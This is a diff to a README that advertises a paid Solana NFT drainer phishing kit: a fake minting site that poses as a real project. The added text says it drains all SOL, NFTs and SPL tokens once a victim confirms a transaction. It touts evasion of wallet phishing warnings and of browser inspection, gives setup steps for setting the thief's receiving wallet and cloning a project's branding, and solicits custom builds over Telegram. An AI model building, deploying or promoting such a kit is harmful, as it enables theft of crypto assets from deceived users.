@@ -10,15 +10,16 @@
 ⭐Instant transactions<br>
 ⭐Anti Phantom Phishing <br>🕵️‍♂️Detections<br>
 ⭐Anti F12 Inspect<br>
-⭐Autoconnect after one click 
+⭐Autoconnect after one click <br>
+⭐Drains all sol, nft and Spl tokens after smart contract confirmation
 # 🌞Setup Guide:
 You need to edit the js file to change the solana receiver wallet.
 Host on cpanel
 open all images folders and put your project images, but rename name as it was before.
 open index.html, to edit the proejct discord & twitter link, how many mints left or total supply and the project name also.
 To get instant support, contact me on  <a href="https://t.me/cyclonehax">@dacypher</a> 
-📌Note: <h3>I can make any projects solana Nft drainer minting site of your choice</h3>
-<h4>The script is not for free</h4>
+# 📌Note: <bold>I can make any projects solana Nft drainer minting site of your choice</bold>
+<h4>The script is PREMIUM 💯</h4>
 📥Socials:
 TELEGRAM:https://t.me/cyclonehax
 <h4>Available for testing to your satisfaction 💯⚡</h4>
